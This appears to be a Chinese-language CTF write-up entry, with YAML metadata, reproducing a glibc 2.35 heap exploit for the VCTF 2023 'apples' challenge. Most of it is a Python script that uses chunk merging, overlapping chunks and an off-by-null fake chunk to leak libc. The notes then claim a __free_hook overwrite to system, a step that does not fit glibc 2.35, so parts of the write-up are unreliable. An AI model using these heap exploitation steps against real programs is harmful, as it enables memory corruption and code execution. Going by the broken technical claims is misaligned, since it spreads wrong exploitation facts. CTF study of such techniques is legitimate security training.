---
title: vctf apples leak libc 操作复现（高版本 libc overlapping）
contest: VCTF
year: 2023
difficulty: hard
vuln_type: pwn_unknown
tags: [glibc-2.35, off-by-one, unsortedbin-overlap, chunk-merge, off-by-null, low-byte-00, fake-chunk]
attack_chain:
  - add 8 个 chunk 排布
  - free(0/3/6) 触发 0x860 合并
  - 分割 0x860 + 控制 fd/bk
  - add 0x450 设 chunk3 为 allocated
  - 改 chunk0 fd
  - free 序列触发 overlapping
  - 假 chunk 头 + 低地址 0x00 (便于 off-by-null)
  - free 触发 unlink 检查
  - 泄 libc + 改 __free_hook
key_payload: unsortedbin 合并 + overlapping + off-by-null
one_liner: VCTF apples leak libc 操作复现，高版本 glibc 堆合并 + overlapping。
lesson: 高版本 glibc 2.35 堆合并时 off-by-one 可以构造精确的 overlapping + 假 chunk。
quality: high
---

VCTF apples leak libc 复现（来源 ctfiot）。

**核心技巧链**

```python
add(0x410, "a" * 8)  # 0
add(0x100, "a" * 8)  # 1
add(0x430, "a" * 8)  # 2
add(0x430, "a" * 8)  # 3
add(0x100, "a" * 8)  # 4
add(0x480, "a" * 8)  # 5
add(0x420, "a" * 8)  # 6
add(0x10, "a" * 8)   # 7

free(0); free(3); free(6)
# 触发合并 → 0x860 大 chunk
# fd/bk 在 0x440 位置

free(2)
# 分配 0x450 触发 split，让 chunk3 为 allocated
# 假 chunk 头构造

add(0x450, b"a" * 0x438 + p16(0x551))  # 0
add(0x410, "a" * 8)  # 2
add(0x420, "a" * 8)  # 3
add(0x410, "a" * 8)  # 6

# 覆写 chunk0 的 fd
free(6); free(3); free(5)
add(0x4f0, b"b" * 0x488 + p64(0x431))  # 3
add(0x3b0, "a" * 8)  # 5

free(4)
add(0x108, b"c" * 0x100 + p64(0x550))  # 4
add(0x400, "a" * 8)  # 6
free(3)
add(0x10, "a" * 8)  # 3
show(6)  # 泄 libc
```

**关键洞**：
- chunk3 地址低字节为 0x00 → 便于 off-by-null
- 假 chunk 头让 FD→bk / BK→fd 指向我们构造的 chunk
- 合并触发合并 + overlapping
- 改 __free_hook → system

**glibc 2.35 利用要点**：
- tcache_perthread_struct 偏移
- safe-linking 异或密钥
- off-by-null 构造 fake chunk 时要满足 size 检查
- 合并时 fd_nextsize/bk_nextsize 也要合法

**质量**：高质量高版本 glibc 堆利用复现。
